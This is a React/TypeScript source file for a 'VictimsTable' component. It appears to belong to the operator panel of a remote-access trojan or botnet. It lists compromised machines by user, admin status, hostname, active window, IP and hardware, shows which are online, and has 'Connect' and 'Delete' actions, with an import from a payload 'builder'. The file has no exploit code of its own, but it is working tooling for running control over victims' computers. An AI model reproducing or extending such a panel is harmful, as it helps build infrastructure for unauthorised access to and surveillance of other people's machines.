import Image from "next/image";
import { useCallback, useEffect, useMemo, useRef, useState, type MouseEvent as ReactMouseEvent } from "react";
import { createPortal } from "react-dom";
import { useQueryClient } from "@tanstack/react-query";
import { flexRender, getCoreRowModel, type ColumnDef, useReactTable } from "@tanstack/react-table";

import type { Victim } from "../../api/victims";
import { useVictimsTablePrefs } from "./victims-table-prefs-provider";
import { csrfHeaders } from "../../builder/utils/csrf";
import { showToast } from "../../toast";
import { cn } from "../../../../lib/utils";
import { victimsColumnSizeClass, type VictimsColumnKey } from "./victims-columns";
import { useVictimsTableColumnReorder } from "./use-victims-table-column-reorder";
import { countryCodeToFlagEmoji } from "../utils/country-flag";
import { getVictimDeviceIconSrc } from "../utils/victim-device-icon";
import { formatTime, getLastActiveMs, isVictimOnline } from "../utils/victim-status";

export function VictimsTable(props: {
   victims: Victim[];
   isLoading: boolean;
   isError: boolean;
   selectedVictimId: string | null;
   onSelectVictim: (victimId: string) => void;
   onOpenDetail: (victimId: string) => void;
   onSnapshotVictim?: (victim: Victim) => void;
}) {
   const { victims, isLoading, isError, selectedVictimId, onSelectVictim, onOpenDetail, onSnapshotVictim } = props;
   const prefs = useVictimsTablePrefs();

   const qc = useQueryClient();

   const tableContainerRef = useRef<HTMLDivElement | null>(null);
   const dragScrollRef = useRef<{
      dragging: boolean;
      armed: boolean;
      moved: boolean;
      startX: number;
      startScrollLeft: number;
      pointerId: number | null;
   }>({
      dragging: false,
      armed: false,
      moved: false,
      startX: 0,
      startScrollLeft: 0,
      pointerId: null,
   });

   const [ctxOpen, setCtxOpen] = useState(false);
   const [ctxDbOpen, setCtxDbOpen] = useState(false);
   const [ctxVictimId, setCtxVictimId] = useState<string>("");
   const [ctxPos, setCtxPos] = useState<{ left: number; top: number } | null>(null);
   const ctxMenuRef = useRef<HTMLDivElement | null>(null);

   const [headerRow, setHeaderRow] = useState<HTMLTableRowElement | null>(null);
   const headerRowRef = useCallback((el: HTMLTableRowElement | null) => {
      setHeaderRow(el);
   }, []);

   useVictimsTableColumnReorder({
      headerRow,
      columnOrder: prefs.columnOrder,
      setColumnOrder: prefs.setColumnOrder,
   });

   const closeCtx = useMemo(
      () => () => {
         setCtxOpen(false);
         setCtxDbOpen(false);
         setCtxVictimId("");
         setCtxPos(null);
      },
      [],
   );

   const onOpenContextMenu = useCallback(
      (e: ReactMouseEvent<HTMLTableRowElement>, victim: Victim, victimId: string) => {
         try {
            e.preventDefault();
            e.stopPropagation();
         } catch {
         }

         const vid = String(victimId || "").trim();
         if (!vid) return;

         try {
            if (onSnapshotVictim) onSnapshotVictim(victim);
         } catch {
         }

         const menuWidth = 160;
         const menuHeight = 40;
         const pad = 4;
         const vw = window.innerWidth || 0;
         const vh = window.innerHeight || 0;

         let x = e.clientX;
         let y = e.clientY;
         if (x + menuWidth > vw) x = Math.max(pad, vw - menuWidth - pad);
         if (y + menuHeight > vh) y = Math.max(pad, vh - menuHeight - pad);

         setCtxVictimId(vid);
         setCtxDbOpen(false);
         setCtxPos({ left: x, top: y });
         setCtxOpen(true);
      },
      [onSnapshotVictim],
   );

   useEffect(() => {
      if (!ctxOpen) return;

      const onDoc = (e: globalThis.MouseEvent) => {
         const t = e.target as Node | null;
         if (!t) {
            closeCtx();
            return;
         }
         const menu = ctxMenuRef.current;
         if (menu && menu.contains(t)) return;
         closeCtx();
      };

      const onKey = (e: globalThis.KeyboardEvent) => {
         if (e.key === "Escape") closeCtx();
      };

      document.addEventListener("mousedown", onDoc);
      document.addEventListener("keydown", onKey);
      return () => {
         document.removeEventListener("mousedown", onDoc);
         document.removeEventListener("keydown", onKey);
      };
   }, [closeCtx, ctxOpen]);

   useEffect(() => {
      const el = tableContainerRef.current;
      if (!el) return;

      const clearDrag = () => {
         const st = dragScrollRef.current;
         st.dragging = false;
         st.armed = false;
         st.moved = false;
         try {
            if (st.pointerId != null) el.releasePointerCapture(st.pointerId);
         } catch {
         }
         try {
            el.removeEventListener("pointermove", onPointerMove);
         } catch {
         }
         st.pointerId = null;
         try {
            el.classList.remove("isDragScrolling");
         } catch {
         }
      };

      const onPointerDown = (e: PointerEvent) => {
         if (!e || e.button !== 0) return;
         try {
            const th = (e.target as Element | null)?.closest?.("th");
            if (th) return;
         } catch {
         }

         const st = dragScrollRef.current;
         st.dragging = false;
         st.armed = true;
         st.moved = false;
         st.startX = e.clientX;
         st.startScrollLeft = el.scrollLeft;
         st.pointerId = e.pointerId;

         try {
            el.addEventListener("pointermove", onPointerMove, { passive: false });
         } catch {
         }
      };

      const onPointerMove = (e: PointerEvent) => {
         const st = dragScrollRef.current;
         if (!st.armed && !st.dragging) return;
         if (st.pointerId != null && e.pointerId !== st.pointerId) return;

         const dx = e.clientX - st.startX;
         if (!st.moved && Math.abs(dx) > 10) {
            st.moved = true;
            st.dragging = true;
            try {
               if (st.pointerId != null) el.setPointerCapture(st.pointerId);
            } catch {
            }
            try {
               el.classList.add("isDragScrolling");
            } catch {
            }
         }

         if (st.moved) {
            el.scrollLeft = st.startScrollLeft - dx;
            try {
               e.preventDefault();
            } catch {
            }
         }
      };

      const onClickCapture = (e: globalThis.MouseEvent) => {
         const st = dragScrollRef.current;
         if (!st.moved) return;
         try {
            e.preventDefault();
            e.stopPropagation();
         } catch {
         }
      };

      el.addEventListener("pointerdown", onPointerDown);
      el.addEventListener("pointerup", clearDrag);
      el.addEventListener("pointercancel", clearDrag);
      el.addEventListener("click", onClickCapture, true);

      return () => {
         el.removeEventListener("pointerdown", onPointerDown);
         el.removeEventListener("pointerup", clearDrag);
         el.removeEventListener("pointercancel", clearDrag);
         el.removeEventListener("click", onClickCapture, true);
         try {
            el.removeEventListener("pointermove", onPointerMove);
         } catch {
         }
      };
   }, []);

   const columns = useMemo(() => {
      const headerMeta = (col: VictimsColumnKey): { label?: string; withIcon?: boolean; iconOnly?: boolean } => {
         switch (col) {
            case "h-country":
               return { label: "loc" };
            case "h-icon":
               return { withIcon: true, iconOnly: true };
            case "h-user":
               return { label: "user", withIcon: true };
            case "h-admin":
               return { label: "admin" };
            case "h-pc-name":
               return { label: "pc-name", withIcon: true };
            case "h-window":
               return { label: "window", withIcon: true };
            case "h-last-active":
               return { label: "last active", withIcon: true };
            case "h-id":
               return { label: "id" };
            case "h-ip":
               return { label: "ip", withIcon: true };
            case "h-os":
               return { label: "os", withIcon: true };
            case "h-cpu":
               return { label: "cpu", withIcon: true };
            case "h-ram":
               return { label: "ram", withIcon: true };
            case "h-gpu":
               return { label: "gpu", withIcon: true };
            case "h-comment":
               return { label: "comment", withIcon: true };
            default:
               return {};
         }
      };

      const headerRenderer = (col: VictimsColumnKey) => {
         const meta = headerMeta(col);
         const label = meta.label;
         const withIcon = !!meta.withIcon;
         const iconOnly = !!meta.iconOnly;

         if (col === "h-admin" || col === "h-id") return label;

         return (
            <span className="thLabel inline-flex items-center gap-[6px]">
               <span className="thSep mr-[6px] opacity-65">|</span>
               {withIcon && (
                  <Image
                     className="thIcon h-[14px] w-[14px] opacity-90 [filter:brightness(0)_invert(1)]"
                     src="/icons/listtop.svg"
                     alt=""
                     width={14}
                     height={14}
                     draggable={false}
                  />
               )}
               {!iconOnly && <span>{label}</span>}
            </span>
         );
      };

      const colDef = (col: VictimsColumnKey): ColumnDef<Victim> => {
         return {
            id: col,
            header: () => headerRenderer(col),
            cell: (ctx) => {
               const v = ctx.row.original;
               const online = isVictimOnline(v);
               const id = String(v.id ?? "");
               const flag = countryCodeToFlagEmoji(v.country);
               const formatLastActive = (victim: Victim): string => {
                  const ms = getLastActiveMs(victim);
                  return ms ? formatTime(ms) : "";
               };

               switch (col) {
                  case "h-country":
                     return flag || v.country || "";
                  case "h-icon":
                     return (
                        <Image
                           className={cn(
                              "h-[36px] w-[36px] align-middle opacity-90",
                              "[filter:grayscale(1)_brightness(0.7)]",
                              online &&
                              "opacity-100 ![filter:brightness(0)_saturate(100%)_invert(36%)_sepia(99%)_saturate(4245%)_hue-rotate(306deg)_brightness(104%)_contrast(106%)]",
                           )}
                           src={getVictimDeviceIconSrc(v)}
                           alt="icon"
                           width={36}
                           height={36}
                           draggable={false}
                        />
                     );
                  case "h-user":
                     return <span className="font-normal text-white/[0.96]">{v.user ?? ""}</span>;
                  case "h-admin":
                     return v.admin ? "True" : "False";
                  case "h-pc-name":
                     return v.hostname ?? "";
                  case "h-window":
                     return v.window ?? "";
                  case "h-last-active":
                     return formatLastActive(v);
                  case "h-id":
                     return id;
                  case "h-ip":
                     return v.ip ?? "";
                  case "h-os":
                     return v.os ?? "";
                  case "h-cpu":
                     return v.cpu ?? "";
                  case "h-ram":
                     return v.ram ?? "";
                  case "h-gpu":
                     return v.gpu ?? "";
                  case "h-comment":
                     return v.comment ?? "";
                  default:
                     return null;
               }
            },
         };
      };

      return prefs.columnOrder.map((k) => colDef(k));
   }, [prefs.columnOrder]);

   const table = useReactTable({
      data: victims,
      columns,
      getRowId: (row, index) => {
         const id = String((row as Victim).id ?? "").trim();
         return id || `row-${index}`;
      },
      state: {
         columnOrder: prefs.columnOrder,
         columnVisibility: prefs.columnVisibility,
      },
      onColumnOrderChange: (updater) => {
         try {
            const next = typeof updater === "function" ? updater(prefs.columnOrder) : updater;
            prefs.setColumnOrder(next as VictimsColumnKey[]);
         } catch {
         }
      },
      onColumnVisibilityChange: (updater) => {
         try {
            const prev = prefs.columnVisibility as Record<string, boolean>;
            const next = typeof updater === "function" ? updater(prev) : updater;
            prefs.setColumnVisibility(next as unknown as typeof prefs.columnVisibility);
         } catch {
         }
      },
      getCoreRowModel: getCoreRowModel(),
   });

   const onDeleteVictim = async (victimId: string) => {
      const id = String(victimId || "").trim();
      if (!id) return;

      try {
         const res = await fetch(`/api/victims/?id=${encodeURIComponent(id)}`, {
            method: "DELETE",
            credentials: "same-origin",
            headers: {
               ...csrfHeaders(),
            },
         });
         if (!res.ok) {
            let msg = "Failed to delete victim";
            try {
               const t = await res.text();
               if (t && String(t).trim()) msg = String(t).trim();
            } catch {
            }
            showToast("error", msg);
            return;
         }

         qc.setQueryData(["victims"], (prev: unknown) => {
            const arr = Array.isArray(prev) ? (prev as Victim[]) : [];
            return arr.filter((v) => String((v as { id?: unknown }).id ?? "") !== id);
         });
         try {
            await qc.invalidateQueries({ queryKey: ["victims"] });
         } catch {
         }
      } catch {
         showToast("error", "Failed to delete victim");
      }
   };

   return (
      <div
         ref={tableContainerRef}
         className={
            "relative box-border mx-auto my-[12px] h-[calc(100%-24px)] w-full max-w-[calc(100%-40px)] overflow-x-auto overflow-y-auto rounded-[18px] border border-white/[0.16] bg-[rgba(18,18,18,0.66)] px-[12px] pb-[12px] pt-[8px] shadow-[0_18px_44px_rgba(0,0,0,0.6),0_0_0_4px_rgba(255,255,255,0.04)] backdrop-blur-[10px] touch-auto"
         }
         style={{ scrollbarWidth: "thin", scrollbarColor: "rgba(120,120,120,0.9) transparent" }}
      >
         <div className="inline-block min-w-full align-top">
            <table className="victims-table table-auto w-full min-w-max border-collapse text-[20px] font-[550] leading-[1.05] text-white/[0.99]">
               <thead>
                  {table.getHeaderGroups().map((hg) => (
                     <tr key={hg.id} ref={hg.id === table.getHeaderGroups()[0]?.id ? headerRowRef : undefined}>
                        {hg.headers.map((h) => {
                           const colId = String(h.column.id) as VictimsColumnKey;
                           return (
                              <th
                                 key={h.id}
                                 className={cn(
                                    "sticky top-0 z-[2] bg-[#202020] px-[4px] pb-[3px] pt-0 text-left text-[20px] font-normal leading-[1.05] text-white/[0.98]",
                                    "select-none whitespace-nowrap",
                                    "isReorderable",
                                    colId,
                                    victimsColumnSizeClass(colId),
                                 )}
                                 style={{ borderBottom: "3px solid var(--line)" }}
                              >
                                 {h.isPlaceholder ? null : flexRender(h.column.columnDef.header, h.getContext())}
                              </th>
                           );
                        })}
                     </tr>
                  ))}
               </thead>
               <tbody>
                  {isLoading ? (
                     <tr>
                        <td className="py-3 text-sm text-white/80">loading...</td>
                     </tr>
                  ) : isError ? (
                     <tr>
                        <td className="py-3 text-sm text-white/80">failed to load</td>
                     </tr>
                  ) : (
                     table.getRowModel().rows.map((row) => {
                        const v = row.original;
                        const id = String(v.id ?? "");
                        const isSelected = id === selectedVictimId;

                        return (
                           <tr
                              key={row.id}
                              data-victim-id={id}
                              className={cn(
                                 "border-b border-white/[0.04]",
                                 "hover:bg-white/[0.03]",
                                 isSelected && "bg-white/[0.04]",
                              )}
                              onClick={() => onSelectVictim(id)}
                              onDoubleClick={() => onOpenDetail(id)}
                              onContextMenu={(e: ReactMouseEvent<HTMLTableRowElement>) => onOpenContextMenu(e, v, id)}
                           >
                              {row.getVisibleCells().map((cell) => {
                                 const colId = String(cell.column.id) as VictimsColumnKey;
                                 return (
                                    <td key={cell.id} className={cn(colId, victimsColumnSizeClass(colId), "px-[8px] py-[4px] text-left whitespace-nowrap")}>
                                       {flexRender(cell.column.columnDef.cell, cell.getContext())}
                                    </td>
                                 );
                              })}
                           </tr>
                        );
                     })
                  )}
               </tbody>
            </table>

            {ctxOpen && ctxPos
               ? createPortal(
                  <div
                     ref={ctxMenuRef}
                     style={{ left: ctxPos.left, top: ctxPos.top }}
                     className="fixed z-[9999] w-[160px] select-none overflow-hidden rounded-[12px] border border-white/[0.14] bg-[rgba(12,12,12,0.96)] shadow-[0_22px_54px_rgba(0,0,0,0.65)]"
                  >
                     <button
                        type="button"
                        className="flex w-full items-center justify-between gap-2 px-[12px] py-[10px] text-left text-[13px] font-bold text-white hover:bg-white/[0.06]"
                        onClick={() => {
                           const vid = ctxVictimId;
                           if (!vid) return;
                           closeCtx();
                           onOpenDetail(vid);
                        }}
                     >
                        <span>Connect</span>
                        <span className="text-white/50">›</span>
                     </button>

                     <button
                        type="button"
                        className="flex w-full items-center justify-between gap-2 px-[12px] py-[10px] text-left text-[13px] font-bold text-white hover:bg-white/[0.06]"
                        onClick={(e) => {
                           try {
                              e.preventDefault();
                              e.stopPropagation();
                           } catch {
                           }
                           setCtxDbOpen((v) => !v);
                        }}
                     >
                        <span>Database</span>
                        <span className="text-white/50">›</span>
                     </button>

                     {ctxDbOpen ? (
                        <div className="border-t border-white/[0.08]">
                           <button
                              type="button"
                              className="flex w-full items-center justify-between gap-2 px-[12px] py-[10px] text-left text-[13px] font-bold text-[#ff7070] hover:bg-[rgba(255,75,75,0.10)]"
                              onClick={() => {
                                 const vid = ctxVictimId;
                                 closeCtx();
                                 void onDeleteVictim(vid);
                              }}
                           >
                              <span>Delete</span>
                           </button>
                        </div>
                     ) : null}
                  </div>,
                  document.body,
               )
               : null}
         </div>
      </div>
   );
}
